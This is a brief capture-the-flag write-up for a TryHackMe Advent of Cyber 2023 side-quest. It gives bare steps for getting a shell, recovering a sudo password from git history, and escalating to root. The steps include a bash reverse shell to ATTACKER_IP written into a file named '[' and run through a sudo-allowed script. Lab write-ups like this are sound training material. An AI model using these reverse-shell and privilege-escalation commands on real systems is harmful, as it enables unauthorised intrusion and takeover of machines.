# AoC23 Sidequest 4: The Bandit Surfer
You can find the challenge here: <https://tryhackme.com/room/surfingyetiiscomingtotown>. You could find a QR code to this challenge on [AoC23](https://tryhackme.com/room/adventofcyber2023) day 20.

**WARNING**: this writeup only tells you the solution without explaining it. Only use it if you understand everything without further explanation. 


1. run `python exploit.py MACHINE_IP ATTACKER_IP` to get a shell as mcskidy
2. in a second terminal window, run `nc -lnvp 4455`
3. in the mcskidy shell, type `cd app` then `git show c1a0b22905cc0da0b5ad88c124125efa626013af` to find mcskidys sudo password
4. run `cd ..`
5. run `echo 'bash -i >& /dev/tcp/ATTACKER_IP/4455 0>&1'>[` and `chmod +x [`
6. run `sudo /usr/bin/bash /opt/check.sh` using mcskidys sudo password
7. in your second terminal a root shell should have opened. enjoy!
